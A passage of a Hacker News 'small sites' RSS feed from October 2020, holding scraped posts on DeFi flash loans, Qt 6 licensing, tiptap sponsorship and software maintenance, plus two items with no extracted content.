<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://provesrc.com/blog/celebrating-3-years/">https://provesrc.com/blog/celebrating-3-years/</a></em></p>]]>
            </description>
            <link>https://provesrc.com/blog/celebrating-3-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929051</guid>
            <pubDate>Thu, 29 Oct 2020 10:41:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flash Loans]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928762">thread link</a>) | @theocs
<br/>
October 29, 2020 | https://blog.cfelde.com/2020/10/flash-loans/ | <a href="https://web.archive.org/web/*/https://blog.cfelde.com/2020/10/flash-loans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p>What would you do if you could borrow a near unlimited amount of money, only need to pay the interest, and not need to provide any collateral?</p>
<p>Sure, we have something like that with credit cards, at an outrageous interest rate, and with fairly small credit limits. But what if I‚Äôd give you this non-collateralized loan for just 0.09%?</p>
<p>Sure, you‚Äôd think, I‚Äôm happy to rip you off. But here‚Äôs the thing, you can‚Äôt rip me off, and I‚Äôm not scamming you.</p>
<p>The above is possible with something called flash loans, a new type of financial instrument, only possible on blockchains like Ethereum.</p>
<p>In short, it‚Äôs a DeFi protocol where you obtain the loan at the start of your transaction, do whatever you want to do with it, and then return it back with interest at the end of the same transaction. If you‚Äôre unable to return it, the flash loan protocol fails, failing the transaction, rolling back the whole set of actions as if nothing happened.</p>
<p>This only works because everything that happens within one transaction is atomic. It either all happens as described or nothing is saved to the blockchain state.</p>
<p>Having access to liquidity this cheaply opens a huge amount of opportunity, but also headaches. An example of a flash loan provider is <a href="https://aave.com/flash-loans">Aave</a>, with their, as of writing this, 0.09% fee.</p>
<p>There‚Äôs been a few examples of this causing issues. Offering anyone access to this much liquidity enables smart people to explore and exploit insecure protocols. Examples include <a href="https://medium.com/dragonfly-research/flash-loans-why-flash-attacks-will-be-the-new-normal-5144e23ac75a">a couple of attacks on the margin trading protocol bZx</a>, and more recently <a href="https://forum.makerdao.com/t/urgent-flash-loans-and-securing-the-maker-protocol/4901">an attack on the governance voting system used by MakerDAO</a>, the system behind the 2 billion dollar <a href="https://makerdao.com/">DAI</a> stablecoin.</p>
<p>Taking a step back, its not like flash loans themselves are causing these issues. Anyone could with similar liquidity, without using flash loans, trigger the same set of conditions. Instead, what flash loans enable, is firstly a very efficient tool to enable a lot of great things, and secondly an opportunity to highlight issues that need fixing in insecure or inefficient blockchain protocols. No hacks needed, they‚Äôre just pointing out the obvious.</p>
<p>A typical use case of where flash loans add much benefit to everyone involved is when you‚Äôd like to change the collateral used for minting DAI. With a flash loan you can cheaply get access to the liquidity needed to make this swap in one transaction, rather than the usual multi transaction setup. This brings more stability to the DAI ecosystem, and removes price movement risks you‚Äôd otherwise expose yourself to if you had to perform this swap over multiple transactions.</p>
<p>So flash loans are here to stay, and they‚Äôll help shore up bad protocols, and enable more efficient financial transactions. Another example of where DeFi delivers tools not available in <a href="https://www.ledger.com/defi-vs-cefi-how-defi-measures-up">the old CeFi world</a>.</p>
</div>
</div></div>]]>
            </description>
            <link>https://blog.cfelde.com/2020/10/flash-loans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928762</guid>
            <pubDate>Thu, 29 Oct 2020 09:51:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[  You will need a subscription license to access Qt 6 (non-LGPL)]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24928720">thread link</a>) | @deng
<br/>
October 29, 2020 | https://www.qt.io/faq/what-happens-to-my-perpetual-licenses-once-i-convert-to-subscription | <a href="https://web.archive.org/web/*/https://www.qt.io/faq/what-happens-to-my-perpetual-licenses-once-i-convert-to-subscription">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span><span>Yes. If your </span><span>Qt licenses are perpetual, you may continue to use the product in perpetuity after your maintenance expires.&nbsp; Access to product and technical support will only be available via the purchase of an Extended Maintenance Contract for software releases that are end-of-life. If you opt not to renew, please note that Qt will not guarantee to support software versions acquired with a perpetual license.</span></span></p>
<p><span><span>Please note, you will need a subscription license to access Qt 6.</span></span></p>
<!--more-->
<p><span><span>Qt versions can be viewed <a href="https://wiki.qt.io/QtReleasing" rel="noopener">here</a>.</span></span></p>
</span></p></div>]]>
            </description>
            <link>https://www.qt.io/faq/what-happens-to-my-perpetual-licenses-once-i-convert-to-subscription</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928720</guid>
            <pubDate>Thu, 29 Oct 2020 09:44:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sponsoring Tiptap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24928523">thread link</a>) | @hanspagel
<br/>
October 29, 2020 | https://blog.ueber.io/post/sponsoring-tiptap/ | <a href="https://web.archive.org/web/*/https://blog.ueber.io/post/sponsoring-tiptap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Too many open source developers abandon their projects because they can‚Äôt sustain their work. Funding the development, maintenance, and support of an open source project can be challenging. Let‚Äôs find out together how this can work for tiptap.</p>

<p>There is a significant advantage to make such thoughts for tiptap. This advantage is you. With so many people using, talking about, and contributing to tiptap, we felt the tailwind to start the <a href="https://blog.ueber.io/post/our-plan-for-tiptap-2/">development of tiptap 2</a> confidently.</p>
<p>Now that we are knee-deep in the development, we don‚Äôt want this journey to end with the release of tiptap 2. There are too many plans and ideas for making it even better for you and everybody. We need to find a way to sustain our work on it.</p>
<p>And we are in this together, aren‚Äôt we? You want to work with an always up to date package, and you want to have reliable support if something is not working out, and you want the coolest newest features. That‚Äôs why we ask you to contribute to the thinking behind the project and why we make everything around it as transparent as our codebase already is.</p>
<h2 id="the-rough-idea">The rough idea</h2>
<p>After evaluating <a href="https://blog.ueber.io/post/monetizing-open-source/">a few different ways to monetize an open source project</a> and having strong opinions against a few of them, we focused on one idea. Internally, we refer to it as <em>tiptap pro</em>. Nothing is defined here, not even the name, or if it needs a name at all. However, there is a rough idea of it. First of all, let us be clear with that:</p>
<p><strong>The whole codebase is going to stay open and accessible for everyone. No matter where you come from or what you plan to do, you should be able to start your project with tiptap.</strong></p>
<p>On top of that, we plan to provide professional users (developers and companies who make money with tiptap) with additional, valuable benefits. Those benefits, and only those, will require your sponsorship.</p>

<p>There is still much work to be done to show what we‚Äôve got to you. Nevertheless, we are very proud of the parts we‚Äôve tackled already and invited very few people to chat with us in private ways, which is fantastic for our current development phase.</p>
<p>The precise and constructive feedback from the teams, familiar with the current version of tipap, guides our work. That‚Äôs valuable for us and everyone who is waiting for the new version.</p>
<p>That said, nothing we do should be private. We want everything to be open, transparent, and accessible, and a closed community won‚Äôt. While we think it could give a great benefit for a few users, we don‚Äôt believe the community would benefit from it equally and abandoned the idea.</p>
<h3 id="2-labeled-issues-and-contributions">#2 Labeled issues and contributions</h3>
<p>From now on, all issues and pull requests created by sponsors of our organization will automatically get a <code>sponsor üíñ</code> label attached. It‚Äôs just a tiny change but helps us make extra sure to jump in those contributions as soon as possible and support the people who support us.</p>
<p>That said, we hope to get funding for the development to a level that makes it possible to put enough time into the project, to help everyone quickly, professionally, and equally. That‚Äôs what we aim for.</p>
<h3 id="3-professional-extensions">#3 Professional extensions</h3>
<p>The power of tiptap is its extensibility, and with tiptap 2 we will double down on that. The new version will start with fewer extensions, but we plan to add many more extensions.</p>
<p>A few of those extensions are complicated to build, have complex requirements, will probably need more maintenance and support, and are likely to be used in a professional context.</p>
<p>With <em>tiptap pro</em>, we‚Äôd like to ask people who use those extensions in a commercial product to <a href="https://github.com/sponsors/ueberdosis" target="_blank" rel="nofollow noopener noreferrer">sponsor the further development, maintenance, and support</a> of those extensions.</p>
<p>But we won‚Äôt ask people using it for personal projects, university projects, open source projects, or other non-profit projects to sponsor us.</p>
<h2 id="does-that-sound-right-to-you">Does that sound right to you?</h2>
<p>We‚Äôre excited to hear your thoughts on this. We want to take this journey with all of you! Reach out to us <a href="https://twitter.com/hanspagel/status/1321738829468999682" target="_blank" rel="nofollow noopener noreferrer">on Twitter</a>, <a href="https://github.com/ueberdosis/tiptap/issues/547" target="_blank" rel="nofollow noopener noreferrer">on GitHub</a>, on <a href="https://news.ycombinator.com/item?id=24928523" target="_blank" rel="nofollow noopener noreferrer">HackerNews</a> or <a href="mailto:hans.pagel@ueber.io" target="_blank" rel="nofollow noopener noreferrer">send an email to me</a>!</p>
</section></div>]]>
            </description>
            <link>https://blog.ueber.io/post/sponsoring-tiptap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928523</guid>
            <pubDate>Thu, 29 Oct 2020 09:02:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What do apples and software have in common?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928491">thread link</a>) | @nonoesp
<br/>
October 29, 2020 | https://sketch.nono.ma/apples-and-software | <a href="https://web.archive.org/web/*/https://sketch.nono.ma/apples-and-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <div>

    
          <svg data-name="sketch.nono.ma" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 153"><defs></defs><title>Sketch.Nono.MA</title><path d="M182.51,57.42v1.29a8.6,8.6,0,0,0,.48,3.47,1.85,1.85,0,0,0,1.82,1c1.34,0,2-1.05,2-3.14a8,8,0,0,0-.12-1.42,6.27,6.27,0,0,0-.44-1.38,11.32,11.32,0,0,0-.84-1.52c-.36-.54-.81-1.17-1.36-1.9l-2.22-3.23c-.71-1-1.3-1.92-1.77-2.72a18.44,18.44,0,0,1-1.13-2.28,10,10,0,0,1-.61-2,11.93,11.93,0,0,1-.17-2,6.9,6.9,0,0,1,1.79-5,6.43,6.43,0,0,1,4.84-1.85,6,6,0,0,1,3.86,1.23,5.77,5.77,0,0,1,2,3.43c.06.28.11.53.14.74a6.16,6.16,0,0,1,.07.69c0,.25,0,.57,0,1v1.57l-4.4.43c0-.83,0-1.42,0-1.79a6.37,6.37,0,0,0-.12-1.07c-.16-1.33-.78-2-1.86-2-1.24,0-1.86,1-1.86,3a9.55,9.55,0,0,0,.07,1.26,4.32,4.32,0,0,0,.39,1.21,16.05,16.05,0,0,0,1,1.66l1.77,2.66,2.27,3.23a21.45,21.45,0,0,1,2.4,4.58,12.66,12.66,0,0,1,.84,4.34,6.61,6.61,0,0,1-1.7,4.89,6.53,6.53,0,0,1-4.85,1.71,6.34,6.34,0,0,1-6.55-4.73,14.33,14.33,0,0,1-.29-3.26v-.83a8.51,8.51,0,0,1,.05-.88Z"></path><path d="M211.28,66.84h-4.69l-3.33-15L201.32,57v9.8h-4.54V35.11h4.54V47.05l4.4-11.94h4.6l-4.07,10.71Z"></path><path d="M226.51,35.11V39.3h-6.38v8.8h4.45v4.18h-4.45V62.65h6.77v4.19H215.59V35.11Z"></path><path d="M234.59,39.3h-4.21V35.11h13.15V39.3h-4.4V66.84h-4.54Z"></path><path d="M259.92,55.52c0,.85.06,1.51.08,2s0,.91,0,1.36q0,8.46-6.53,8.46-6.33,0-6.33-7.61V42.25q0-7.61,6.33-7.61Q260,34.64,260,43V44a13.8,13.8,0,0,1-.1,1.45h-4.54a12,12,0,0,0,.09-1.21v-1a10.26,10.26,0,0,0-.4-3.54,1.54,1.54,0,0,0-1.58-.93,1.44,1.44,0,0,0-1.43.69,6.93,6.93,0,0,0-.36,2.77V59.67a6.93,6.93,0,0,0,.36,2.77,1.44,1.44,0,0,0,1.43.69,1.56,1.56,0,0,0,1.56-.88,9,9,0,0,0,.42-3.36c0-.53,0-1,0-1.49s0-1.09-.07-1.88Z"></path><path d="M270.13,52.28V66.84h-4.55V35.07h4.55v13h3.57v-13h4.55V66.84H273.7V52.28Z"></path><path d="M283.91,62.08h4.54v4.76h-4.54Z"></path><path d="M309.34,66.84h-4.55l-5.22-16.65V66.84H295V35.11h3.85l5.91,18.7V35.11h4.55Z"></path><path d="M328.34,58.75c0,1,0,1.73,0,2.33s-.08,1.12-.14,1.55a4.63,4.63,0,0,1-.29,1.09,7.46,7.46,0,0,1-.53,1,5.56,5.56,0,0,1-2.25,1.92,7.4,7.4,0,0,1-6.24,0,5.56,5.56,0,0,1-2.25-1.92,7.46,7.46,0,0,1-.53-1,5.11,5.11,0,0,1-.31-1.09,10.43,10.43,0,0,1-.15-1.55c0-.6,0-1.38,0-2.33V43.15c0-.95,0-1.73,0-2.33a10.28,10.28,0,0,1,.15-1.54,5.21,5.21,0,0,1,.31-1.1,7.39,7.39,0,0,1,.53-1,5.63,5.63,0,0,1,2.25-1.88,7.4,7.4,0,0,1,6.24,0,5.63,5.63,0,0,1,2.25,1.88,7.39,7.39,0,0,1,.53,1,4.72,4.72,0,0,1,.29,1.1c.06.42.11.94.14,1.54s0,1.38,0,2.33ZM323.8,41.38a3.47,3.47,0,0,0-.43-2,1.6,1.6,0,0,0-1.41-.6,1.62,1.62,0,0,0-1.39.6,3.29,3.29,0,0,0-.45,2V60.57a3.51,3.51,0,0,0,.42,2,2,2,0,0,0,2.81,0,3.33,3.33,0,0,0,.45-2Z"></path><path d="M348.84,66.84H344.3l-5.23-16.65V66.84h-4.54V35.11h3.85l5.92,18.7V35.11h4.54Z"></path><path d="M367.84,58.75c0,1,0,1.73,0,2.33s-.08,1.12-.14,1.55a4.63,4.63,0,0,1-.29,1.09,7.46,7.46,0,0,1-.53,1,5.56,5.56,0,0,1-2.25,1.92,7.4,7.4,0,0,1-6.24,0,5.56,5.56,0,0,1-2.25-1.92,7.46,7.46,0,0,1-.53-1,5.11,5.11,0,0,1-.31-1.09,10.43,10.43,0,0,1-.15-1.55c0-.6,0-1.38,0-2.33V43.15c0-.95,0-1.73,0-2.33a10.28,10.28,0,0,1,.15-1.54,5.21,5.21,0,0,1,.31-1.1,7.39,7.39,0,0,1,.53-1,5.63,5.63,0,0,1,2.25-1.88,7.4,7.4,0,0,1,6.24,0,5.63,5.63,0,0,1,2.25,1.88,7.39,7.39,0,0,1,.53,1,4.72,4.72,0,0,1,.29,1.1c.06.42.11.94.14,1.54s0,1.38,0,2.33ZM363.3,41.38a3.38,3.38,0,0,0-.43-2,1.6,1.6,0,0,0-1.41-.6,1.62,1.62,0,0,0-1.39.6,3.29,3.29,0,0,0-.45,2V60.57a3.42,3.42,0,0,0,.43,2,1.62,1.62,0,0,0,1.41.59,1.64,1.64,0,0,0,1.39-.59,3.33,3.33,0,0,0,.45-2Z"></path><path d="M374.37,62.08h4.55v4.76h-4.55Z"></path><path d="M397.19,35.11h5.42V66.84h-3.87V44.44L395,66.84H393l-3.77-22.4v22.4h-3.77V35.11h5.32L394,50.9Z"></path><path d="M412.62,66.84h-4.36l4.4-31.73h5.81l4.2,31.73h-4.4l-.82-7.14h-4.06Zm2.8-26-1.55,14.7H417Z"></path><path d="M96.84,97.69c-1.56,0-2.5.76-2.5,1.8s1.21,1.63,2.34,1.9l1.3.32c2.08.5,4,1.59,4.06,4s-1.93,4.09-5.24,4.09-5.26-1.54-5.36-4.29H93.9c.1,1.45,1.31,2.15,2.88,2.15s2.75-.79,2.76-2-1-1.53-2.48-1.91l-1.58-.41c-2.27-.58-3.68-1.72-3.68-3.71,0-2.44,2.17-4.07,5.07-4.07s4.93,1.65,5,4H99.44C99.32,98.38,98.33,97.69,96.84,97.69Z"></path><path d="M103.78,95.76h2.44v7.61h.17l3.73-4.16H113l-4,4.47,4.25,5.89h-2.93l-3.16-4.43-.9,1v3.48h-2.44Z"></path><path d="M113.33,104.45c0-3.19,1.94-5.37,4.91-5.37,2.55,0,4.73,1.6,4.73,5.23v.75h-7.21a2.55,2.55,0,0,0,2.64,2.81,2.16,2.16,0,0,0,2.19-1.33l2.28.25c-.43,1.8-2.09,3-4.5,3C115.24,109.77,113.33,107.7,113.33,104.45Zm7.3-1a2.3,2.3,0,0,0-2.36-2.43,2.5,2.5,0,0,0-2.51,2.43Z"></path><path d="M129.83,101.1h-2v5.36c0,1,.49,1.2,1.11,1.2a3.12,3.12,0,0,0,.71-.1l.41,1.91a4.8,4.8,0,0,1-1.43.24c-1.84.06-3.26-.9-3.24-2.85V101.1h-1.47V99.21h1.47V96.73h2.44v2.48h2Z"></path><path d="M131,104.43c0-3.16,1.91-5.35,5-5.35,2.53,0,4.28,1.47,4.45,3.72H138a2,2,0,0,0-2.09-1.75c-1.5,0-2.51,1.25-2.51,3.34s1,3.39,2.51,3.39A2,2,0,0,0,138,106h2.33c-.18,2.2-1.84,3.74-4.44,3.74C132.82,109.77,131,107.57,131,104.43Z"></path><path d="M144.42,109.57H142V95.76h2.39V101h.12a3,3,0,0,1,3.09-1.89c2.15,0,3.56,1.39,3.56,3.9v6.59H148.7v-6.22a2,2,0,0,0-2-2.21,2.15,2.15,0,0,0-2.24,2.36Z"></path><path d="M152.8,104.45c0-3.19,1.94-5.37,4.91-5.37,2.55,0,4.73,1.6,4.73,5.23v.75h-7.21a2.55,2.55,0,0,0,2.64,2.81,2.16,2.16,0,0,0,2.19-1.33l2.28.25c-.43,1.8-2.09,3-4.5,3C154.71,109.77,152.8,107.7,152.8,104.45Zm7.3-1a2.3,2.3,0,0,0-2.36-2.43,2.49,2.49,0,0,0-2.51,2.43Z"></path><path d="M170.09,102.19a1.81,1.81,0,0,0-1.91-1.29c-1,0-1.79.48-1.78,1.18s.41,1,1.46,1.21l1.77.37c2,.43,2.9,1.33,2.91,2.81,0,2-1.83,3.3-4.42,3.3s-4.15-1.12-4.45-3l2.38-.23a1.86,1.86,0,0,0,2.06,1.41c1.16,0,1.93-.53,1.93-1.24s-.45-1-1.4-1.18l-1.76-.37c-2-.41-2.92-1.41-2.92-2.92,0-1.92,1.69-3.14,4.19-3.14s3.83,1.12,4.17,2.87Z"></path><path d="M178,106.66c0-2.33,1.92-2.93,3.93-3.15,1.83-.19,2.57-.22,2.57-.93v0c0-1-.62-1.59-1.76-1.59a2.06,2.06,0,0,0-2.12,1.31l-2.28-.32c.54-1.89,2.21-2.86,4.39-2.86,2,0,4.21.82,4.21,3.56v6.93h-2.35v-1.42h-.08a3.21,3.21,0,0,1-3,1.63C179.52,109.78,178,108.7,178,106.66Zm6.5-.8v-1.23a7.34,7.34,0,0,1-2.24.51c-1.09.15-1.9.55-1.9,1.48s.72,1.37,1.74,1.37A2.21,2.21,0,0,0,184.53,105.86Z"></path><path d="M191.5,109.57h-2.45V99.21h2.34V101h.12a3.11,3.11,0,0,1,3.09-1.89c2.14,0,3.55,1.41,3.55,3.9v6.59H195.7v-6.22a2,2,0,0,0-2-2.21,2.12,2.12,0,0,0-2.19,2.36Z"></path><path d="M199.83,104.41c0-3.46,1.89-5.33,4.28-5.33a3.08,3.08,0,0,1,3,1.84h.1V95.76h2.45v13.81h-2.4v-1.63h-.15a3.13,3.13,0,0,1-3,1.81C201.66,109.75,199.83,107.82,199.83,104.41Zm7.39,0c0-2-.86-3.31-2.44-3.31s-2.46,1.38-2.46,3.31.85,3.36,2.46,3.36S207.22,106.4,207.22,104.39Z"></path><path d="M222.15,102.19a1.81,1.81,0,0,0-1.91-1.29c-1,0-1.79.48-1.78,1.18s.41,1,1.46,1.21l1.77.37c1.95.43,2.9,1.33,2.91,2.81,0,2-1.83,3.3-4.42,3.3s-4.14-1.12-4.45-3l2.38-.23a1.86,1.86,0,0,0,2.06,1.41c1.16,0,1.93-.53,1.93-1.24s-.45-1-1.4-1.18l-1.76-.37c-2-.41-2.92-1.41-2.92-2.92,0-1.92,1.7-3.14,4.19-3.14s3.83,1.12,4.17,2.87Z"></path><path d="M231.42,101.1h-2v5.36c0,1,.49,1.2,1.11,1.2a3.12,3.12,0,0,0,.71-.1l.41,1.91a4.8,4.8,0,0,1-1.43.24c-1.84.06-3.25-.9-3.24-2.85V101.1h-1.47V99.21h1.47V96.73h2.44v2.48h2Z"></path><path d="M232.53,104.43c0-3.21,1.93-5.35,5-5.35s5,2.14,5,5.35-1.93,5.34-5,5.34S232.53,107.64,232.53,104.43Zm7.45,0c0-1.9-.82-3.42-2.47-3.42s-2.51,1.52-2.51,3.42.83,3.39,2.51,3.39S240,106.32,240,104.43Z"></path><path d="M244.15,99.21h2.36v1.73h.11a2.6,2.6,0,0,1,2.56-1.88,5.79,5.79,0,0,1,.87.07v2.25a4.54,4.54,0,0,0-1.13-.14,2.21,2.21,0,0,0-2.33,2.24v6.09h-2.44Z"></path><path d="M251.11,96.42a1.42,1.42,0,1,1,1.42,1.32A1.38,1.38,0,0,1,251.11,96.42Zm.19,2.79h2.44v10.36H251.3Z"></path><path d="M255.43,104.45c0-3.19,1.94-5.37,4.9-5.37,2.55,0,4.74,1.6,4.74,5.23v.75h-7.22a2.55,2.55,0,0,0,2.64,2.81,2.17,2.17,0,0,0,2.2-1.33l2.28.25c-.44,1.8-2.09,3-4.51,3C257.34,109.77,255.43,107.7,255.43,104.45Zm7.3-1a2.31,2.31,0,0,0-2.36-2.43,2.48,2.48,0,0,0-2.51,2.43Z"></path><path d="M272.72,102.19a1.82,1.82,0,0,0-1.91-1.29c-1,0-1.8.48-1.79,1.18s.41,1,1.46,1.21l1.77.37c2,.43,2.91,1.33,2.92,2.81,0,2-1.84,3.3-4.43,3.3s-4.14-1.12-4.44-3l2.38-.23a1.85,1.85,0,0,0,2.05,1.41c1.16,0,1.93-.53,1.93-1.24s-.44-1-1.39-1.18l-1.77-.37c-2-.41-2.92-1.41-2.91-2.92,0-1.92,1.69-3.14,4.18-3.14s3.84,1.12,4.17,2.87Z"></path><path d="M281.25,95.76h2.44v5.16h.1a3.09,3.09,0,0,1,3-1.84c2.4,0,4.28,1.87,4.28,5.33s-1.83,5.34-4.27,5.34a3.14,3.14,0,0,1-3-1.81h-.14v1.63h-2.4Zm4.83,12c1.61,0,2.46-1.42,2.46-3.36s-.83-3.31-2.46-3.31-2.44,1.3-2.44,3.31S284.52,107.75,286.08,107.75Z"></path><path d="M292.27,113.33l.57-2c1.07.31,1.77.22,2.23-.92l.25-.66-3.76-10.58h2.59l2.39,7.83h.1l2.4-7.83h2.59l-4.18,11.71a3.65,3.65,0,0,1-3.64,2.68A4.33,4.33,0,0,1,292.27,113.33Z"></path><path d="M318.74,109.57h-2.23l-6.5-9.41h-.12v9.41h-2.5V95.76h2.24l6.5,9.41h.12V95.76h2.49Z"></path><path d="M320.53,104.43c0-3.21,1.93-5.35,5-5.35s5,2.14,5,5.35-1.93,5.34-5,5.34S320.53,107.64,320.53,104.43Zm7.45,0c0-1.9-.82-3.42-2.47-3.42s-2.5,1.52-2.5,3.42.82,3.39,2.5,3.39S328,106.32,328,104.43Z"></path><path d="M334.59,109.57h-2.44V99.21h2.33V101h.12a3.11,3.11,0,0,1,3.09-1.89c2.14,0,3.56,1.41,3.55,3.9v6.59H338.8v-6.22a2,2,0,0,0-2-2.21,2.12,2.12,0,0,0-2.19,2.36Z"></path><path d="M342.91,104.43c0-3.21,1.93-5.35,5-5.35s5,2.14,5,5.35-1.92,5.34-5,5.34S342.91,107.64,342.91,104.43Zm7.45,0c0-1.9-.82-3.42-2.48-3.42s-2.5,1.52-2.5,3.42.83,3.39,2.5,3.39S350.36,106.32,350.36,104.43Z"></path><path d="M362,95.76l4.1,10h.16l4.1-10h3.06v13.81h-2.4v-9.49h-.13l-3.81,9.45h-1.8l-3.81-9.47h-.13v9.51H359V95.76Z"></path><path d="M375.47,106.66c0-2.33,1.92-2.93,3.93-3.15,1.83-.19,2.56-.22,2.56-.93v0c0-1-.62-1.59-1.75-1.59a2.06,2.06,0,0,0-2.12,1.31l-2.28-.32c.54-1.89,2.21-2.86,4.39-2.86,2,0,4.21.82,4.21,3.56v6.93h-2.35v-1.42H382a3.21,3.21,0,0,1-3,1.63C377,109.78,375.47,108.7,375.47,106.66Zm6.5-.8v-1.23a7.41,7.41,0,0,1-2.24.51c-1.09.15-1.91.55-1.91,1.48s.73,1.37,1.75,1.37A2.21,2.21,0,0,0,382,105.86Z"></path><path d="M386.49,99.21h2.37v1.73H389a2.58,2.58,0,0,1,2.55-1.88,5.92,5.92,0,0,1,.88.07v2.25a4.54,4.54,0,0,0-1.13-.14,2.21,2.21,0,0,0-2.34,2.24v6.09h-2.44Z"></path><path d="M399.47,101.1h-2.05v5.36c0,1,.5,1.2,1.11,1.2a3.33,3.33,0,0,0,.72-.1l.41,1.91a4.88,4.88,0,0,1-1.44.24c-1.83.06-3.25-.9-3.24-2.85V101.1h-1.47V99.21H395V96.73h2.44v2.48h2.05Z"></path><path d="M401.13,99.21h2.45v10.36h-2.45Zm1.8-4.44h2.39l-2.07,3.08h-1.83Z"></path><path d="M408.15,109.57h-2.44V99.21H408V101h.12a3.11,3.11,0,0,1,3.09-1.89c2.14,0,3.55,1.41,3.55,3.9v6.59h-2.44v-6.22a2,2,0,0,0-2-2.21,2.12,2.12,0,0,0-2.19,2.36Z"></path><path d="M416.47,104.45c0-3.19,1.93-5.37,4.9-5.37,2.55,0,4.73,1.6,4.73,5.23v.75h-7.21a2.55,2.55,0,0,0,2.64,2.81,2.16,2.16,0,0,0,2.19-1.33l2.28.25c-.43,1.8-2.09,3-4.5,3C418.38,109.77,416.47,107.7,416.47,104.45Zm7.29-1A2.3,2.3,0,0,0,421.4,101a2.5,2.5,0,0,0-2.51,2.43Z"></path><path d="M427.66,108l5.34-6.7v-.08h-5.17v-2H436v1.67l-5.09,6.58v.09h5.26v2h-8.5Z"></path><path d="M441.63,109.57l4.87-13.81h3.08l4.87,13.81h-2.67l-1.14-3.4h-5.2l-1.14,3.4Zm8.33-5.41-1.87-5.57H448l-1.87,5.57Z"></path><path d="M458.24,109.57h-2.45V95.76h2.45Z"></path><path d="M459.92,104.43c0-3.21,1.93-5.35,5-5.35s5,2.14,5,5.35-1.93,5.34-5,5.34S459.92,107.64,459.92,104.43Zm7.45,0c0-1.9-.82-3.42-2.47-3.42s-2.5,1.52-2.5,3.42.82,3.39,2.5,3.39S467.37,106.32,467.37,104.43Z"></path><path d="M474,109.57h-2.44V99.21h2.33V101H474a3.11,3.11,0,0,1,3.09-1.89c2.14,0,3.55,1.41,3.55,3.9v6.59h-2.44v-6.22a2,2,0,0,0-2-2.21A2.12,2.12,0,0,0,474,103.5Z"></path><path d="M488.7,102.19a1.81,1.81,0,0,0-1.91-1.29c-1,0-1.79.48-1.78,1.18s.41,1,1.46,1.21l1.77.37c1.95.43,2.91,1.33,2.91,2.81,0,2-1.83,3.3-4.42,3.3s-4.14-1.12-4.45-3l2.38-.23a1.86,1.86,0,0,0,2.06,1.41c1.16,0,1.93-.53,1.93-1.24s-.44-1-1.4-1.18l-1.76-.37c-2-.41-2.92-1.41-2.92-2.92,0-1.92,1.7-3.14,4.19-3.14s3.83,1.12,4.17,2.87Z"></path><path d="M492.35,104.43c0-3.21,1.93-5.35,5-5.35s5,2.14,5,5.35-1.93,5.34-5,5.34S492.35,107.64,492.35,104.43Zm7.45,0c0-1.9-.82-3.42-2.47-3.42s-2.51,1.52-2.51,3.42.83,3.39,2.51,3.39S499.8,106.32,499.8,104.43Z"></path></svg>
    
    

            <p><img src="https://nono.imgix.net/img/u/sketch-191109_apple-fruit-04-and-software-have-in-common.jpg?auto=format%2Ccompress&amp;ixlib=php-3.3.0&amp;w=2500"></p>

    <p><a href="https://sketch.nono.ma/updates-are-available">Software, as fruit, rots.</a> If you leave it there for long enough it will go bad, and programs stop working. When the dependencies of a program and the environment in which it runs get updated, different pieces of code break. You need to re-write parts of it to make it compatible with the latest "breaking changes."</p>
<p>Code maintenance is a labor of love‚Äîand even more when your software is open source as other programs might rely on it.</p>
<p>The biggest platform to share and find open-source software is GitHub. The "stars" of a project are the code-equivalent to Instagram or Facebook likes, usually indicative of how likely a repository of code is to withstand the test of time, as they often represent not only the size of a project's community but how quickly code gets fixed when it breaks.</p>


  </div>



  </div><div>
      <p><img src="https://nono.imgix.net/folio/images/veil.gif" data-src="https://nono.imgix.net/img/u/sketch-nono-ma-logo.svg"></p>
<hr>
<p>
My sketches and stories, in&nbsp;your&nbsp;inbox.
</p>

<p><span>One email per week. No spam ever.</span></p>

<p><img src="https://sketch.nono.ma/img/u/profile-nono-ma-sketch.jpg" alt="Pencil sketch of Nono Mart√≠nez Alonso.">
</p>


      </div></div>]]>
            </description>
            <link>https://sketch.nono.ma/apples-and-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928491</guid>
            <pubDate>Thu, 29 Oct 2020 08:56:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Sleep Specialist Opinion]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928366">thread link</a>) | @nquryshi
<br/>
October 29, 2020 | https://getontology.com/sleep | <a href="https://web.archive.org/web/*/https://getontology.com/sleep">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://getontology.com/sleep</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928366</guid>
            <pubDate>Thu, 29 Oct 2020 08:27:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Weimarization of the American Republic]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928340">thread link</a>) | @barry-cotter
<br/>
October 29, 2020 | https://www.americanpurpose.com/articles/weimarization-american-republic/ | <a href="https://web.archive.org/web/*/https://www.americanpurpose.com/articles/weimarization-american-republic/">archive.org</a>
